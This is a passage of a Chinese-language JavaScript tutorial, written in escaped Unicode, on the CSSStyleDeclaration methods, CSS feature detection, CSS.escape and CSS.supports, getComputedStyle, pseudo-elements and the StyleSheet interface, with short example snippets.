\u7684\u5c5e\u6027\u503c\u4e0d\u7528\u6539\u5199 CSS \u5c5e\u6027\u540d\u3002 \u5220\u9664\u4e00\u4e2a\u5143\u7d20\u7684\u6240\u6709\u884c\u5185\u6837\u5f0f\uff0c\u6700\u7b80\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u8bbe\u7f6e cssText \u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 1 divStyle . cssText = '' ; \uff082\uff09CSSStyleDeclaration.length CSSStyleDeclaration.length \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5f53\u524d\u89c4\u5219\u5305\u542b\u591a\u5c11\u6761\u6837\u5f0f\u58f0\u660e\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"myDiv\" // style=\"height: 1px;width: 100%;background-color: #CA1;\" // ></div> var myDiv = document . getElementById ( 'myDiv' ); var divStyle = myDiv . style ; divStyle . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c myDiv \u5143\u7d20\u7684\u884c\u5185\u6837\u5f0f\u5171\u5305\u542b3\u6761\u6837\u5f0f\u89c4\u5219\u3002 \uff083\uff09CSSStyleDeclaration.parentRule CSSStyleDeclaration.parentRule \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u6240\u5c5e\u7684\u90a3\u4e2a\u6837\u5f0f\u5757\uff08CSSRule \u5b9e\u4f8b\uff09\u3002\u5982\u679c\u4e0d\u5b58\u5728\u6240\u5c5e\u7684\u6837\u5f0f\u5757\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 \u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u4e14\u53ea\u5728\u4f7f\u7528 CSSRule \u63a5\u53e3\u65f6\u6709\u610f\u4e49\u3002 1 2 3 var declaration = document . styleSheets [ 0 ]. rules [ 0 ]. style ; declaration . parentRule === document . styleSheets [ 0 ]. rules [ 0 ] // true CSSStyleDeclaration \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \uff081\uff09CSSStyleDeclaration.getPropertyPriority() CSSStyleDeclaration.getPropertyPriority \u65b9\u6cd5\u63a5\u53d7 CSS \u6837\u5f0f\u7684\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6709\u6ca1\u6709\u8bbe\u7f6e important \u4f18\u5148\u7ea7\u3002\u5982\u679c\u6709\u5c31\u8fd4\u56de important \uff0c\u5426\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"margin: 10px!important; color: red;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . margin // \"10px\" style . getPropertyPriority ( 'margin' ) // \"important\" style . getPropertyPriority ( 'color' ) // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c margin \u5c5e\u6027\u6709 important \u4f18\u5148\u7ea7\uff0c color \u5c5e\u6027\u6ca1\u6709\u3002 \uff082\uff09CSSStyleDeclaration.getPropertyValue() CSSStyleDeclaration.getPropertyValue \u65b9\u6cd5\u63a5\u53d7 CSS \u6837\u5f0f\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"margin: 10px!important; color: red;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . margin // \"10px\" style . getPropertyValue ( \"margin\" ) // \"10px\" \uff083\uff09CSSStyleDeclaration.item() CSSStyleDeclaration.item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . item ( 0 ) // \"color\" style . item ( 1 ) // \"background-color\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0 \u53f7\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u662f color \uff0c 1 \u53f7\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u662f background-color \u3002 \u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u62a5\u9519\u3002\u5982\u679c\u53c2\u6570\u503c\u8d85\u8fc7\u5b9e\u9645\u7684\u5c5e\u6027\u6570\u76ee\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u503c\u3002 \uff084\uff09CSSStyleDeclaration.removeProperty() CSSStyleDeclaration.removeProperty \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u5728 CSS \u89c4\u5219\u91cc\u9762\u79fb\u9664\u8fd9\u4e2a\u5c5e\u6027\uff0c\u8fd4\u56de\u8fd9\u4e2a\u5c5e\u6027\u539f\u6765\u7684\u503c\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"> // 111 // </div> var style = document . getElementById ( 'myDiv' ). style ; style . removeProperty ( 'color' ) // 'red' // HTML \u4ee3\u7801\u53d8\u4e3a // <div id=\"myDiv\" style=\"background-color: white;\"> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5220\u9664 color \u5c5e\u6027\u4ee5\u540e\uff0c\u5b57\u4f53\u989c\u8272\u4ece\u7ea2\u8272\u53d8\u6210\u9ed8\u8ba4\u989c\u8272\u3002 \uff085\uff09CSSStyleDeclaration.setProperty() CSSStyleDeclaration.setProperty \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u65b0\u7684 CSS \u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u5c5e\u6027\u540d\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u5c5e\u6027\u503c\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u5982\u679c\u7701\u7565\uff0c\u5219\u53c2\u6570\u503c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff1a\u4f18\u5148\u7ea7\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u5982\u679c\u8bbe\u7f6e\uff0c\u552f\u4e00\u7684\u5408\u6cd5\u503c\u662f important \uff0c\u8868\u793a CSS \u89c4\u5219\u91cc\u9762\u7684 !important \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"> // 111 // </div> var style = document . getElementById ( 'myDiv' ). style ; style . setProperty ( 'border' , '1px solid blue' ); \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u540e\uff0c myDiv \u5143\u7d20\u5c31\u4f1a\u51fa\u73b0\u84dd\u8272\u7684\u8fb9\u6846\u3002 CSS \u6a21\u5757\u7684\u4fa6\u6d4b \u00b6 CSS \u7684\u89c4\u683c\u53d1\u5c55\u592a\u5feb\uff0c\u65b0\u7684\u6a21\u5757\u5c42\u51fa\u4e0d\u7a77\u3002\u4e0d\u540c\u6d4f\u89c8\u5668\u7684\u4e0d\u540c\u7248\u672c\uff0c\u5bf9 CSS \u6a21\u5757\u7684\u652f\u6301\u60c5\u51b5\u90fd\u4e0d\u4e00\u6837\u3002\u6709\u65f6\u5019\uff0c\u9700\u8981\u77e5\u9053\u5f53\u524d\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301\u67d0\u4e2a\u6a21\u5757\uff0c\u8fd9\u5c31\u53eb\u505a\u201cCSS\u6a21\u5757\u7684\u4fa6\u6d4b\u201d\u3002 \u4e00\u4e2a\u6bd4\u8f83\u666e\u904d\u9002\u7528\u7684\u65b9\u6cd5\u662f\uff0c\u5224\u65ad\u5143\u7d20\u7684 style \u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u503c\u662f\u5426\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 typeof element . style . animationName === 'string' ; typeof element . style . transform === 'string' ; \u5982\u679c\u8be5 CSS \u5c5e\u6027\u786e\u5b9e\u5b58\u5728\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5373\u4f7f\u8be5\u5c5e\u6027\u5b9e\u9645\u4e0a\u5e76\u672a\u8bbe\u7f6e\uff0c\u4e5f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8be5\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u8fd4\u56de undefined \u3002 1 2 document . body . style [ 'maxWidth' ] // \"\" document . body . style [ 'maximumWidth' ] // undefined \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u8fd9\u4e2a\u6d4f\u89c8\u5668\u652f\u6301 max-width \u5c5e\u6027\uff0c\u4f46\u662f\u4e0d\u652f\u6301 maximum-width \u5c5e\u6027\u3002 \u6ce8\u610f\uff0c\u4e0d\u7ba1 CSS \u5c5e\u6027\u540d\u7684\u5199\u6cd5\u5e26\u4e0d\u5e26\u8fde\u8bcd\u7ebf\uff0c style \u5c5e\u6027\u4e0a\u90fd\u80fd\u53cd\u6620\u51fa\u8be5\u5c5e\u6027\u662f\u5426\u5b58\u5728\u3002 1 2 document . body . style [ 'backgroundColor' ] // \"\" document . body . style [ 'background-color' ] // \"\" \u53e6\u5916\uff0c\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u628a\u4e0d\u540c\u6d4f\u89c8\u5668\u7684 CSS \u524d\u7f00\u4e5f\u8003\u8651\u8fdb\u53bb\u3002 1 2 var content = document . getElementById ( 'content' ); typeof content . style [ 'webkitAnimation' ] === 'string' \u8fd9\u79cd\u4fa6\u6d4b\u65b9\u6cd5\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function isPropertySupported ( property ) { if ( property in document . body . style ) return true ; var prefixes = [ 'Moz' , 'Webkit' , 'O' , 'ms' , 'Khtml' ]; var prefProperty = property . charAt ( 0 ). toUpperCase () + property . substr ( 1 ); for ( var i = 0 ; i < prefixes . length ; i ++ ){ if (( prefixes [ i ] + prefProperty ) in document . body . style ) return true ; } return false ; } isPropertySupported ( 'background-clip' ) // true CSS \u5bf9\u8c61 \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b CSS \u5bf9\u8c61\uff0c\u4e3a JavaScript \u64cd\u4f5c CSS \u63d0\u4f9b\u4e00\u4e9b\u5de5\u5177\u65b9\u6cd5\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u76ee\u524d\u6709\u4e24\u4e2a\u9759\u6001\u65b9\u6cd5\u3002 CSS.escape() \u00b6 CSS.escape \u65b9\u6cd5\u7528\u4e8e\u8f6c\u4e49 CSS \u9009\u62e9\u5668\u91cc\u9762\u7684\u7279\u6b8a\u5b57\u7b26\u3002 1 < div id = \"foo#bar\" > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8be5\u5143\u7d20\u7684 id \u5c5e\u6027\u5305\u542b\u4e00\u4e2a # \u53f7\uff0c\u8be5\u5b57\u7b26\u5728 CSS \u9009\u62e9\u5668\u91cc\u9762\u6709\u7279\u6b8a\u542b\u4e49\u3002\u4e0d\u80fd\u76f4\u63a5\u5199\u6210 document.querySelector('#foo#bar') \uff0c\u53ea\u80fd\u5199\u6210 document.querySelector('#foo\\\\#bar') \u3002\u8fd9\u91cc\u5fc5\u987b\u4f7f\u7528\u53cc\u659c\u6760\u7684\u539f\u56e0\u662f\uff0c\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u672c\u8eab\u4f1a\u8f6c\u4e49\u4e00\u6b21\u659c\u6760\u3002 CSS.escape \u65b9\u6cd5\u5c31\u7528\u6765\u8f6c\u4e49\u90a3\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002 1 document . querySelector ( '#' + CSS . escape ( 'foo#bar' )) CSS.supports() \u00b6 CSS.supports \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u73af\u5883\u662f\u5426\u652f\u6301\u67d0\u4e00\u53e5 CSS \u89c4\u5219\u3002 \u5b83\u7684\u53c2\u6570\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u4e00\u79cd\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5c5e\u6027\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5c5e\u6027\u503c\uff1b\u53e6\u4e00\u79cd\u662f\u6574\u4e2a\u53c2\u6570\u5c31\u662f\u4e00\u884c\u5b8c\u6574\u7684 CSS \u8bed\u53e5\u3002 1 2 3 4 5 // \u7b2c\u4e00\u79cd\u5199\u6cd5 CSS . supports ( 'transform-origin' , '5px' ) // true // \u7b2c\u4e8c\u79cd\u5199\u6cd5 CSS . supports ( 'display: table-cell' ) // true \u6ce8\u610f\uff0c\u7b2c\u4e8c\u79cd\u5199\u6cd5\u7684\u53c2\u6570\u7ed3\u5c3e\u4e0d\u80fd\u5e26\u6709\u5206\u53f7\uff0c\u5426\u5219\u7ed3\u679c\u4e0d\u51c6\u786e\u3002 1 CSS . supports ( 'display: table-cell;' ) // false window.getComputedStyle() \u00b6 \u884c\u5185\u6837\u5f0f\uff08inline style\uff09\u5177\u6709\u6700\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u6539\u53d8\u884c\u5185\u6837\u5f0f\uff0c\u901a\u5e38\u4f1a\u7acb\u5373\u53cd\u6620\u51fa\u6765\u3002\u4f46\u662f\uff0c\u7f51\u9875\u5143\u7d20\u6700\u7ec8\u7684\u6837\u5f0f\u662f\u7efc\u5408\u5404\u79cd\u89c4\u5219\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60f3\u5f97\u5230\u5143\u7d20\u5b9e\u9645\u7684\u6837\u5f0f\uff0c\u53ea\u8bfb\u53d6\u884c\u5185\u6837\u5f0f\u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u5f97\u5230\u6d4f\u89c8\u5668\u6700\u7ec8\u8ba1\u7b97\u51fa\u6765\u7684\u6837\u5f0f\u89c4\u5219\u3002 window.getComputedStyle \u65b9\u6cd5\uff0c\u5c31\u7528\u6765\u8fd4\u56de\u6d4f\u89c8\u5668\u8ba1\u7b97\u540e\u5f97\u5230\u7684\u6700\u7ec8\u89c4\u5219\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a CSSStyleDeclaration \u5b9e\u4f8b\uff0c\u5305\u542b\u4e86\u6307\u5b9a\u8282\u70b9\u7684\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u3002\u6240\u8c13\u201c\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u201d\uff0c\u6307\u7684\u662f\u5404\u79cd CSS \u89c4\u5219\u53e0\u52a0\u540e\u7684\u7ed3\u679c\u3002 1 2 3 var div = document . querySelector ( 'div' ); var styleObj = window . getComputedStyle ( div ); styleObj . backgroundColor \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f97\u5230\u7684\u80cc\u666f\u8272\u5c31\u662f div \u5143\u7d20\u771f\u6b63\u7684\u80cc\u666f\u8272\u3002 \u6ce8\u610f\uff0cCSSStyleDeclaration \u5b9e\u4f8b\u662f\u4e00\u4e2a\u6d3b\u7684\u5bf9\u8c61\uff0c\u4efb\u4f55\u5bf9\u4e8e\u6837\u5f0f\u7684\u4fee\u6539\uff0c\u4f1a\u5b9e\u65f6\u53cd\u6620\u5230\u8fd9\u4e2a\u5b9e\u4f8b\u4e0a\u9762\u3002\u53e6\u5916\uff0c\u8fd9\u4e2a\u5b9e\u4f8b\u662f\u53ea\u8bfb\u7684\u3002 getComputedStyle \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u4f2a\u5143\u7d20\uff08\u6bd4\u5982 :before \u3001 :after \u3001 :first-line \u3001 :first-letter \u7b49\uff09\u3002 1 var result = window . getComputedStyle ( div , ':before' ); \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u5982\u4f55\u83b7\u53d6\u5143\u7d20\u7684\u9ad8\u5ea6\u3002 1 2 3 4 5 6 var elem = document . getElementById ( 'elem-container' ); var styleObj = window . getComputedStyle ( elem , null ) var height = styleObj . height ; // \u7b49\u540c\u4e8e var height = styleObj [ 'height' ]; var height = styleObj . getPropertyValue ( 'height' ); \u4e0a\u9762\u4ee3\u7801\u5f97\u5230\u7684 height \u5c5e\u6027\uff0c\u662f\u6d4f\u89c8\u5668\u6700\u7ec8\u6e32\u67d3\u51fa\u6765\u7684\u9ad8\u5ea6\uff0c\u6bd4\u5176\u4ed6\u65b9\u6cd5\u5f97\u5230\u7684\u9ad8\u5ea6\u66f4\u53ef\u9760\u3002\u7531\u4e8e styleObj \u662f CSSStyleDeclaration \u5b9e\u4f8b\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd CSSStyleDeclaration \u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u6709\u51e0\u70b9\u9700\u8981\u6ce8\u610f\u3002 CSSStyleDeclaration \u5b9e\u4f8b\u8fd4\u56de\u7684 CSS \u503c\u90fd\u662f\u7edd\u5bf9\u5355\u4f4d\u3002\u6bd4\u5982\uff0c\u957f\u5ea6\u90fd\u662f\u50cf\u7d20\u5355\u4f4d\uff08\u8fd4\u56de\u503c\u5305\u62ec px \u540e\u7f00\uff09\uff0c\u989c\u8272\u662f rgb(#, #, #) \u6216 rgba(#, #, #, #) \u683c\u5f0f\u3002 CSS \u89c4\u5219\u7684\u7b80\u5199\u5f62\u5f0f\u65e0\u6548\u3002\u6bd4\u5982\uff0c\u60f3\u8bfb\u53d6 margin \u5c5e\u6027\u7684\u503c\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\uff0c\u53ea\u80fd\u8bfb marginLeft \u3001 marginTop \u7b49\u5c5e\u6027\uff1b\u518d\u6bd4\u5982\uff0c font \u5c5e\u6027\u4e5f\u662f\u4e0d\u80fd\u76f4\u63a5\u8bfb\u7684\uff0c\u53ea\u80fd\u8bfb font-size \u7b49\u5355\u4e2a\u5c5e\u6027\u3002 \u5982\u679c\u8bfb\u53d6 CSS \u539f\u59cb\u7684\u5c5e\u6027\u540d\uff0c\u8981\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u6bd4\u5982 styleObj['z-index'] \uff1b\u5982\u679c\u8bfb\u53d6\u9a86\u9a7c\u62fc\u5199\u6cd5\u7684 CSS \u5c5e\u6027\u540d\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 styleObj.zIndex \u3002 \u8be5\u65b9\u6cd5\u8fd4\u56de\u7684 CSSStyleDeclaration \u5b9e\u4f8b\u7684 cssText \u5c5e\u6027\u65e0\u6548\uff0c\u8fd4\u56de undefined \u3002 CSS \u4f2a\u5143\u7d20 \u00b6 CSS \u4f2a\u5143\u7d20\u662f\u901a\u8fc7 CSS \u5411 DOM \u6dfb\u52a0\u7684\u5143\u7d20\uff0c\u4e3b\u8981\u662f\u901a\u8fc7 :before \u548c :after \u9009\u62e9\u5668\u751f\u6210\uff0c\u7136\u540e\u7528 content \u5c5e\u6027\u6307\u5b9a\u4f2a\u5143\u7d20\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u4e00\u6bb5 HTML \u4ee3\u7801\u3002 1 < div id = \"test\" > Test content </ div > CSS \u6dfb\u52a0\u4f2a\u5143\u7d20 :before \u7684\u5199\u6cd5\u5982\u4e0b\u3002 1 2 3 4 # test : before { content : 'Before ' ; color : #FF0 ; } \u8282\u70b9\u5143\u7d20\u7684 style \u5bf9\u8c61\u65e0\u6cd5\u8bfb\u5199\u4f2a\u5143\u7d20\u7684\u6837\u5f0f\uff0c\u8fd9\u65f6\u5c31\u8981\u7528\u5230 window.getComputedStyle() \u3002JavaScript \u83b7\u53d6\u4f2a\u5143\u7d20\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u3002 1 2 3 4 var test = document . querySelector ( '#test' ); var result = window . getComputedStyle ( test , ':before' ). content ; var color = window . getComputedStyle ( test , ':before' ). color ; \u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 CSSStyleDeclaration \u5b9e\u4f8b\u7684 getPropertyValue \u65b9\u6cd5\uff0c\u83b7\u53d6\u4f2a\u5143\u7d20\u7684\u5c5e\u6027\u3002 1 2 3 4 var result = window . getComputedStyle ( test , ':before' ) . getPropertyValue ( 'content' ); var color = window . getComputedStyle ( test , ':before' ) . getPropertyValue ( 'color' ); StyleSheet \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 StyleSheet \u63a5\u53e3\u4ee3\u8868\u7f51\u9875\u7684\u4e00\u5f20\u6837\u5f0f\u8868\uff0c\u5305\u62ec <link> \u5143\u7d20\u52a0\u8f7d\u7684\u6837\u5f0f\u8868\u548c <style> \u5143\u7d20\u5185\u5d4c\u7684\u6837\u5f0f\u8868\u3002 document \u5bf9\u8c61\u7684 styleSheets \u5c5e\u6027\uff0c\u53ef\u4ee5\u8fd4\u56de\u5f53\u524d\u9875\u9762\u7684\u6240\u6709 StyleSheet \u5b9e\u4f8b\uff08\u5373\u6240\u6709\u6837\u5f0f\u8868\uff09\u3002\u5b83\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 var sheets = document . styleSheets ; var sheet = document . styleSheets [ 0 ]; sheet instanceof StyleSheet // true \u5982\u679c\u662f <style> \u5143\u7d20\u5d4c\u5165\u7684\u6837\u5f0f\u8868\uff0c\u8fd8\u6709\u53e6\u4e00\u79cd\u83b7\u53d6 StyleSheet \u5b9e\u4f8b\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u8fd9\u4e2a\u8282\u70b9\u5143\u7d20\u7684 sheet \u5c5e\u6027\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <style id=\"myStyle\"></style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; myStyleSheet instanceof StyleSheet // true \u4e25\u683c\u5730\u8bf4\uff0c StyleSheet \u63a5\u53e3\u4e0d\u4ec5\u5305\u62ec\u7f51\u9875\u6837\u5f0f\u8868\uff0c\u8fd8\u5305\u62ec XML \u6587\u6863\u7684\u6837\u5f0f\u8868\u3002\u6240\u4ee5\uff0c\u5b83\u6709\u4e00\u4e2a\u5b50\u7c7b CSSStyleSheet \u8868\u793a\u7f51\u9875\u7684 CSS \u6837\u5f0f\u8868\u3002\u6211\u4eec\u5728\u7f51\u9875\u91cc\u9762\u62ff\u5230\u7684\u6837\u5f0f\u8868\u5b9e\u4f8b\uff0c\u5b9e\u9645\u4e0a\u662f CSSStyleSheet \u7684\u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5b50\u63a5\u53e3\u7ee7\u627f\u4e86 StyleSheet \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5e76\u4e14\u5b9a\u4e49\u4e86\u51e0\u4e2a\u81ea\u5df1\u7684\u5c5e\u6027\uff0c\u4e0b\u9762\u628a\u8fd9\u4e24\u4e2a\u63a5\u53e3\u653e\u5728\u4e00\u8d77\u4ecb\u7ecd\u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 StyleSheet \u5b9e\u4f8b\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 \uff081\uff09StyleSheet.disabled StyleSheet.disabled \u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6837\u5f0f\u8868\u662f\u5426\u5904\u4e8e\u7981\u7528\u72b6\u6001\u3002\u624b\u52a8\u8bbe\u7f6e disabled \u5c5e\u6027\u4e3a true \uff0c\u7b49\u540c\u4e8e\u5728 <link> \u5143\u7d20\u91cc\u9762\uff0c\u5c06\u8fd9\u5f20\u6837\u5f0f\u8868\u8bbe\u4e3a alternate stylesheet \uff0c\u5373\u8be5\u6837\u5f0f\u8868\u5c06\u4e0d\u4f1a\u751f\u6548\u3002 \u6ce8\u610f\uff0c disabled \u5c5e\u6027\u53ea\u80fd\u5728 JavaScript \u811a\u672c\u4e2d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u5728 HTML \u8bed\u53e5\u4e2d\u8bbe\u7f6e\u3002 \uff082\uff09Stylesheet.href Stylesheet.href \u8fd4\u56de\u6837\u5f0f\u8868\u7684\u7f51\u5740\u3002\u5bf9\u4e8e\u5185\u5d4c\u6837\u5f0f\u8868\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 document . styleSheets [ 0 ]. href \uff083\uff09StyleSheet.media StyleSheet.media \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 MediaList \u5b9e\u4f8b\uff09\uff0c\u6210\u5458\u662f\u8868\u793a\u9002\u7528\u5a92\u4ecb\u7684\u5b57\u7b26\u4e32\u3002\u8868\u793a\u5f53\u524d\u6837\u5f0f\u8868\u662f\u7528\u4e8e\u5c4f\u5e55\uff08screen\uff09\uff0c\u8fd8\u662f\u7528\u4e8e\u6253\u5370\uff08print\uff09\u6216\u624b\u6301\u8bbe\u5907\uff08handheld\uff09\uff0c\u6216\u5404\u79cd\u5a92\u4ecb\u90fd\u9002\u7528\uff08all\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u9ed8\u8ba4\u503c\u662f screen \u3002 1 2 document . styleSheets [ 0 ]. media . mediaText // \"all\" MediaList \u5b9e\u4f8b\u7684 appendMedium \u65b9\u6cd5\uff0c\u7528\u4e8e\u589e\u52a0\u5a92\u4ecb\uff1b deleteMedium \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u5a92\u4ecb\u3002 1 2 document . styleSheets [ 0 ]. media . appendMedium ( 'handheld' ); document . styleSheets [ 0 ]. media . deleteMedium ( 'print' ); \uff084\uff09StyleSheet.title StyleSheet.title \u5c5e\u6027\u8fd4\u56de\u6837\u5f0f\u8868\u7684 title \u5c5e\u6027\u3002 \uff085\uff09StyleSheet.type StyleSheet.type \u5c5e\u6027\u8fd4\u56de\u6837\u5f0f\u8868\u7684 type \u5c5e\u6027\uff0c\u901a\u5e38\u662f text/css \u3002 1 document . styleSheets [ 0 ]. type // \"text/css\" \uff086\uff09StyleSheet.parentStyleSheet CSS \u7684 @import \u547d\u4ee4\u5141\u8bb8\u5728\u6837\u5f0f\u8868\u4e2d\u52a0\u8f7d\u5176\u4ed6\u6837\u5f0f\u8868\u3002 StyleSheet.parentStyleSheet \u5c5e\u6027\u8fd4\u56de\u5305\u542b\u4e86\u5f53\u524d\u6837\u5f0f\u8868\u7684\u90a3\u5f20\u6837\u5f0f\u8868\u3002\u5982\u679c\u5f53\u524d\u6837\u5f0f\u8868\u662f\u9876\u5c42\u6837\u5f0f\u8868\uff0c\u5219\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 if ( stylesheet . parentStyleSheet ) { sheet = stylesheet . parentStyleSheet ; } else { sheet = stylesheet ; } \uff087\uff09StyleSheet.ownerNode StyleSheet.ownerNode \u5c5e\u6027\u8fd4\u56de StyleSheet \u5bf9\u8c61\u6240\u5728\u7684 DOM \u8282\u70b9\uff0c\u901a\u5e38\u662f <link> \u6216 <style> \u3002\u5bf9\u4e8e\u90a3\u4e9b\u7531\u5176\u4ed6\u6837\u5f0f\u8868\u5f15\u7528\u7684\u6837\u5f0f\u8868\uff0c\u8be5\u5c5e\u6027\u4e3a null \u3002 1 2 3 // HTML\u4ee3\u7801\u4e3a // <link rel=\"StyleSheet\" href=\"example.css\" type=\"text/css\" /> document . styleSheets [ 0 ]. ownerNode // [object HTMLLinkElement] \uff088\uff09CSSStyleSheet.cssRules CSSStyleSheet.cssRules \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 CSSRuleList 